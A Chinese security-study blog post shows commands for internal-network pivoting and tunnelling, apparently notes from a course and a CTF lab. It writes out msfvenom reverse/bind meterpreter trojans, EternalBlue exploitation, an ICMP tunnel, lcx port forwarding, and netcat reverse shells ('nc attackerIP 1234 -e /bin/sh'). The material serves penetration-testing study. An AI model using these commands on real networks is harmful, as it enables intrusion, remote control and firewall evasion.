<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    

<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>

<meta charset="utf-8" >

<title>内网穿透</title>
<meta name="keywords" content="内网穿透, R0seW1thH3r">
<meta name="description" content="内网穿透by小迪">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="shortcut icon" href="/archives/favicon.ico">
<link rel="stylesheet" href="/archives/style/main.css">


<link rel="stylesheet" href="/archives/style/jquery.fancybox.min.css">




    <link rel="stylesheet" href="/archives/style/prism.css"/>




  <meta name="generator" content="Hexo 6.1.0"></head>
  <body>
    <div id="app" class="main">

<div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://R0seW1thH3r.github.io/archives">
        <img class="avatar" src="/archives/images/avatar.png" alt="logo" width="32px" height="32px">
      </a>
      <a href="https://R0seW1thH3r.github.io/archives">
        <h1 class="site-title">R0seW1thH3r</h1>
      </a>
    </div>
    <div class="right">
        <i class="icon menu-switch icon-menu-outline" ></i>
    </div>
  </div>
</div>

<div class="menu-container" style="height: 0;opacity: 0;">
<nav class="menu-list">
  
    
      <a href="/archives/archives" class="menu purple-link">
        Index
      </a>
    
  
    
      <a href="/archives/tags" class="menu purple-link">
        Tags
      </a>
    
  
    
      <a href="/archives/about" class="menu purple-link">
        About
      </a>
    
  
</nav>
</div>



  <div class="content-container">
    <div class="post-detail">
      
      <h2 class="post-title">内网穿透</h2>
      <div class="post-info post-detail-info">
        <span><i class="icon icon-calendar-outline"></i> 2022-08-06</span>
        
          <span>
          <i class="icon icon-pricetags-outline"></i>
            
              <a href="/archives/tags/%E5%86%85%E7%BD%91/">
              内网
                
              </a>
            
          </span>
        
      </div>
      <div class="post-content-wrapper">
        <div class="post-content">
          <h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><p>解决内网之间的通信问题。</p>
<p>主要解决这三类情况：内网有外网、内网有过滤、内网无外网</p>
<h2 id="花生壳内网穿透"><a href="#花生壳内网穿透" class="headerlink" title="花生壳内网穿透"></a>花生壳内网穿透</h2><p>首先在花生壳建立自定义映射，选择的协议要和msf生成的木马一致，这里我选的是tcp的。然后是映射到我本地的kali上，再开一台win7虚拟机作为被控制者。</p>
<p>msf生成木马：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span>外网ip <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">37322</span> --platform win -f exe -o /home/kali/Desktop/54320.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意这里的lhost是花生壳提供给我们的ip&#x2F;域名，lport也是花生壳提供ip的端口。然后把木马放到win7上。</p>
<p>开启msf监听，下面lhost和lport就是我们在花生壳上映射绑定的本地kali的ip和对应端口。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole
use exploit/multi/handler
<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp
<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.1.20
<span class="token builtin class-name">set</span> LPORT <span class="token number">4444</span>
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当win7的木马开始运行时，msf就可以控制win7了。</p>
<h2 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h2><p>先下载frp</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 下载frp可执行包</span>
<span class="token function">wget</span> https://github.com/fatedier/frp/releases/download/v0.43.0/frp_0.43.0_linux_386.tar.gz
<span class="token comment"># 解压</span>
<span class="token function">tar</span> zxf frp_0.43.0_linux_386.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>vps和本地kali都要下载。vps修改frps.ini；kali修改frpc.ini。</p>
<pre class="line-numbers language-none"><code class="language-none">vps的frps.ini：
[common]
bind_port &#x3D; 6677
-----------------------------------------
kali的frpc.ini：
[common]
server_addr &#x3D; vps的ip
server_port &#x3D; 6677

[ssh]
type &#x3D; tcp
local_ip &#x3D; 127.0.0.1
local_port &#x3D; 5555
remote_port &#x3D; 6000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>启动</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">在vps上命令：
./frps -c ./frps.ini
kali上
./frpc -c ./frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后制作木马：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span>vps的ip <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">6000</span> --platform win -f exe -o /home/kali/Desktop/frp.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>传到win7上，kali开启msf监听</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole
use exploit/multi/handler
<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp
<span class="token builtin class-name">set</span> LHOST <span class="token number">127.0</span>.0.1
<span class="token builtin class-name">set</span> LPORT <span class="token number">5555</span>
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>简单原理图：</p>
<p><img src="/./images/frp.png" alt="frp"></p>
<h2 id="CFS三层内网漫游-某CTF线下"><a href="#CFS三层内网漫游-某CTF线下" class="headerlink" title="CFS三层内网漫游-某CTF线下"></a>CFS三层内网漫游-某CTF线下</h2><p><img src="/images/xd12.png" alt="xd12"></p>
<p>首先浏览器访问192.168.22.129:80，拿下webshell后，连接蚁剑，得到第一个flag。</p>
<p>用msf制作一个后门，上传到Target 1，使用蚁剑的终端运行后门。然后用msf连接，</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">制作后门：
msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.76.x <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">1111</span> -f elf -o /home/kali/Desktop/t1.elf
接受反弹：
msfconsole
use exploit/multi/handler
<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp
<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.76.x
<span class="token builtin class-name">set</span> LPORT <span class="token number">1111</span>
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>连接上后进行信息搜集：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">获取网络接口：run get_local_subnets
查看路由地址：run autoroute -p
添加路由地址：run autoroute -s <span class="token number">192.168</span>.22.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>发现存在22这个网段，于是使用命令开启这个网段的路由，使当前会话可以连接到22网段。但是我们只能在msf里连通22网段。我们可以开一个接口作为代理，让所有走这个代理的数据都可以连接到22网段。</p>
<p>开启本地代理：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use auxiliary/server/socks4a
<span class="token builtin class-name">set</span> srvport <span class="token number">2222</span>
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>凡是数据走的是2222这个端口出去的，那么就可以联通22网段。</p>
<p>然后我们使用proxychains调用nmap扫描22网段。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">文件所在路径：/etc/proxychains4.conf
最后一行修改为：	socks4	<span class="token number">192.168</span>.76.x <span class="token number">2222</span>
调用nmap：
proxychains4 nmap -sT -Pn <span class="token number">192.168</span>.22.0/24 -p80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后扫到了80端口是开放的。我们把浏览器代理设置为socks4后，可以打开这个网站。</p>
<p>sql注入拿到后台密码，登录后台利用修改配置文件的功能点，getshell，拿到第二个flag。</p>
<p>然后使用蚁剑连接，注意我们也要给蚁剑设置代理socks4。可以直接在蚁剑设置里配置，也可以使用其他代理工具。比如<code>Proxifier</code> 、<code>SocksCap64</code> </p>
<p>由于Target2不能连接到本地kali，而kali可以通过Target1的路由连接到Target2，所以采用正向连接，我kali攻击者主动找被控端。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">生成正向后门：
msfvenom -p linux/x64/meterpreter/bind_tcp <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">3333</span> -f elf -o /home/kali/Desktop/t2.elf
访问接收：
msfconsole
use exploit/multi/handler
<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/bind_tcp
<span class="token builtin class-name">set</span> rHOST <span class="token number">192.168</span>.22.128
<span class="token builtin class-name">set</span> LPORT <span class="token number">3333</span>
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后我们就拿到了Target2的会话。和之前一样添加33路由，可以再开一个端口使用proxychain4搞nmap，开放着445、3389。</p>
<p>使用永恒之蓝攻击：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use expoit/windows/smb/ms17_010_psexec
<span class="token builtin class-name">set</span> payload windows/meterpreter/bind_tcp
<span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.33.33
exploit
shell
<span class="token function">dir</span> /S flag.txt /B
<span class="token builtin class-name">type</span> xxxx.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>拿到最后一个flag。</p>
<h1 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h1><p>代理只是解决了通信的问题，但是在实际网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。隧道就是一种绕过端口屏蔽的通信方式。通过封装成防火墙允许的数据包类型或端口绕过防火墙，到达之后还原数据，并将其发送到相应服务器上。</p>
<p>常用的隧道技术有以下三种：</p>
<ul>
<li>网络层：IPv6 隧道、ICMP 隧道</li>
<li>传输层：TCP 隧道、UDP 隧道、常规端口转发</li>
<li>应用层：SSH 隧道、HTTP&#x2F;S 隧道、DNS 隧道</li>
</ul>
<h2 id="检测连通性"><a href="#检测连通性" class="headerlink" title="检测连通性"></a>检测连通性</h2><ol>
<li><p>TCP 协议</p>
<p>“瑞士军刀”——netcat</p>
</li>
</ol>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> <span class="token function">ip</span> 端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li><p>HTTP 协议</p>
<p>“curl”工具，如果开启了相应端口，且内网可以连接外网的话，就会输出相应的端口信息。</p>
</li>
</ol>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> ip:端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="3">
<li><p>ICMP 协议</p>
<p>“ping” 命令</p>
</li>
</ol>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ping</span> ip/域名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="4">
<li>DNS 协议</li>
</ol>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">windows：nslookup
linux：dig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h2 id="网络层ICMP"><a href="#网络层ICMP" class="headerlink" title="网络层ICMP"></a>网络层ICMP</h2><p>工具：</p>
<ul>
<li>老版本：<a target="_blank" rel="noopener" href="https://github.com/f1vefour/ptunnel">ptunnel</a> (需自行编译)</li>
<li>新版本：<a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">pingtunnel</a> (二次开发版)</li>
</ul>
<p>pingtunnel 是把 tcp&#x2F;udp&#x2F;sock5 流量伪装成 icmp 流量进行转发的工具。</p>
<p>首先我们是控制了webserver的，要使用这个工具就先下载，在控制机命令行执行：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#安装libpcap的依赖环境</span>
<span class="token function">apt-get</span> <span class="token function">install</span> byacc
<span class="token function">apt-get</span> <span class="token function">install</span> flex bison

<span class="token comment">#安装libpcap依赖库</span>
<span class="token function">wget</span> http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz
<span class="token function">tar</span> -xzvf libpcap-1.9.0.tar.gz
<span class="token builtin class-name">cd</span> libpcap-1.9.0
./configure
<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span>

打开 /etc目录下的文件ld.so.conf ，添加两行
/usr/local/lib
/usr/lib
然后在终端下执行从新加载配置的命令：
ldconfig

<span class="token comment">#安装PingTunnel</span>
<span class="token function">wget</span> http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz
<span class="token function">tar</span> -xzvf PingTunnel-0.72.tar.gz
<span class="token builtin class-name">cd</span> PingTunnel
<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span>

注：部分出错原因：
安装make： yum -y <span class="token function">install</span> gcc automake autoconf libtool <span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>部分参数含义：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-p	 <span class="token comment">##表示连接 icmp 隧道另一端的机器 IP（即目标服务器）</span>
-lp	 <span class="token comment">##表示需要监听的本地 tcp 端口</span>
-da  <span class="token comment">##指定需要转发的机器的 IP（即目标内网某一机器的内网 IP）</span>
-dp	 <span class="token comment">##指定需要转发的机器的端口（即目标内网某一机器的内网端口）</span>
-x	 <span class="token comment">##设置连接的密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>一次实例</strong>：</p>
<table>
<thead>
<tr>
<th align="center">DC</th>
<th align="center">Ubuntu</th>
<th align="center">kali</th>
</tr>
</thead>
<tbody><tr>
<td align="center">10.1.1.1</td>
<td align="center">10.1.1.5  &#x2F;   192.168.27.136</td>
<td align="center">192.168.27.135</td>
</tr>
</tbody></table>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#安装好后执行以下命令，-x是密码。</span>
Ubuntu：ptunnel -x asd

<span class="token comment">#-p是Ubuntu的ip； </span>
<span class="token comment">#-lp是本地的端口，表示把数据转发到我们kali的1080端口；</span>
<span class="token comment">#-da是目标内网的某一台我们想要控制的机器ip，-dp是其端口； </span>
<span class="token comment">#-x是密码。</span>
kali：ptunnel -p <span class="token number">192.168</span>.27.136 -lp <span class="token number">1080</span> -da <span class="token number">10.1</span>.1.1 -dp <span class="token number">3389</span> -x asd

<span class="token comment">#把内网机的3389端口的请求数据给本地 1080</span>
kali：rdesktop <span class="token number">127.0</span>.0.1:1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="传输层lcx"><a href="#传输层lcx" class="headerlink" title="传输层lcx"></a>传输层lcx</h2><p>工具：</p>
<ul>
<li>windows：lcx</li>
<li>linux：portmap</li>
</ul>
<p><strong>lcx_记一次实例</strong>：</p>
<table>
<thead>
<tr>
<th align="center">DC</th>
<th align="center">win2003</th>
<th align="center">kali</th>
</tr>
</thead>
<tbody><tr>
<td align="center">10.1.1.1</td>
<td align="center">10.1.1.2   &#x2F;  192.168.27.134</td>
<td align="center">192.168.27.135</td>
</tr>
</tbody></table>
<p>首先DC和win2003上都要下载lcx。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">DC：		lcx -slave <span class="token number">10.1</span>.1.2 <span class="token number">3131</span> <span class="token number">127.0</span>.0.1 <span class="token number">3389</span> //将DC的3389给跳板win2003的3131
win2k3：	lcx -listen <span class="token number">3131</span> <span class="token number">3333</span> 					//监听3131转发至3333
kali：	rdesktop <span class="token number">192.168</span>.27.134:3333			//kali从win2003的3333端口接收DC的3389<span class="token punctuation">(</span>远程桌面连接服务<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<h2 id="传输层NetCat"><a href="#传输层NetCat" class="headerlink" title="传输层NetCat"></a>传输层NetCat</h2><h3 id="双向连接反弹shell"><a href="#双向连接反弹shell" class="headerlink" title="双向连接反弹shell"></a>双向连接反弹shell</h3><p><strong>正向</strong>：攻击连接受害</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">受害：nc -ldp <span class="token number">1234</span> -e /bin/sh							//linux
 	 <span class="token function">nc</span> -ldp <span class="token number">1234</span> -e c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>cmd.exe 	  //windows
攻击：nc 受害机IP <span class="token number">1234</span>	//主动连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>反向</strong>：受害连接攻击</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">攻击：nc -lvp <span class="token number">1234</span>
受害：nc 攻击机IP <span class="token number">1234</span> -e /bin/sh							//linux
	 <span class="token function">nc</span> 攻击机IP <span class="token number">1234</span> -e c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>cmd.exe	  //windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<h3 id="多向连接反弹shell"><a href="#多向连接反弹shell" class="headerlink" title="多向连接反弹shell"></a>多向连接反弹shell</h3><p><strong>反向</strong>：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Webserver：	Lcx.exe -listen <span class="token number">2222</span> <span class="token number">3333</span>
Sqlserver：	<span class="token function">nc</span> Webserver的内网IP <span class="token number">2222</span> -e c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>cmd.exe
kali：		<span class="token function">nc</span> -v Webserver的外网IP <span class="token number">3333</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<p>学习链接：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=69&vd_source=24835676c297246e6d7893de694251ec">第70天：内网安全-域横向内网漫游Socks代理隧道技术_哔哩哔哩_bilibili</a></p>

        </div>
        <div class="top-div">
          <ol class="top-box"><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#%E4%BB%A3%E7%90%86"><span class="top-box-text">代理</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E8%8A%B1%E7%94%9F%E5%A3%B3%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="top-box-text">花生壳内网穿透</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="top-box-text">frp内网穿透</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8-%E6%9F%90CTF%E7%BA%BF%E4%B8%8B"><span class="top-box-text">CFS三层内网漫游-某CTF线下</span></a></li></ol></li><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#%E9%9A%A7%E9%81%93"><span class="top-box-text">隧道</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E6%A3%80%E6%B5%8B%E8%BF%9E%E9%80%9A%E6%80%A7"><span class="top-box-text">检测连通性</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82ICMP"><span class="top-box-text">网络层ICMP</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BC%A0%E8%BE%93%E5%B1%82lcx"><span class="top-box-text">传输层lcx</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BC%A0%E8%BE%93%E5%B1%82NetCat"><span class="top-box-text">传输层NetCat</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%8F%8C%E5%90%91%E8%BF%9E%E6%8E%A5%E5%8F%8D%E5%BC%B9shell"><span class="top-box-text">双向连接反弹shell</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%A4%9A%E5%90%91%E8%BF%9E%E6%8E%A5%E5%8F%8D%E5%BC%B9shell"><span class="top-box-text">多向连接反弹shell</span></a></li></ol></li></ol></li></ol>
        </div>
      </div>
    </div>

    
      <div class="next-post">
        <a class="purple-link" href="/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
          <h3 class="post-title">
            下一篇：横向移动
          </h3>
        </a>
      </div>
    
  </div>




<footer>
<div class="site-footer">
  <div class="social-container">
    
      
        <a href="https://github.com/" target="_blank">
          <i class="icon icon-github"></i>
        </a>
      
    
      
        <a href="https://twitter.com/" target="_blank">
          <i class="icon icon-twitter"></i>
        </a>
      
    
      
    
      
    
      
    
  </div>
  
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
  
  
  
  
  
  
</div>
</footer>


      </div>
      
    <script src="/archives/js/jquery.min.js"></script>
    <script src="/archives/js/jquery.fancybox.min.js"></script>


<script id="hexo-configurations">
    window.theme_config = {"image":{"lazyload_enable":false}};
    window.is_post = true;
  </script>

<script src="/archives/js/main.js"></script>





    </div>
  </body>
</html>

